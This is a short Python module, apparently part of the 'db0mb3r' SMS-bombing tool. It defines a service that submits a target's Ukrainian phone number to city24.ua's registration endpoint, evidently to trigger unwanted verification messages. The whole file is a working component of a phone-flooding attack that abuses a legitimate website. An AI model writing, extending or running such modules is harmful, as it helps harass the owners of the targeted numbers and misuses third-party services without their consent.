from db0mb3r.services.service import Service


class City24(Service):
    phone_codes = [380]

    async def run(self):
        await self.post(
            "https://city24.ua/personalaccount/account/registration",
            data={"PhoneNumber": self.formatted_phone},
        )
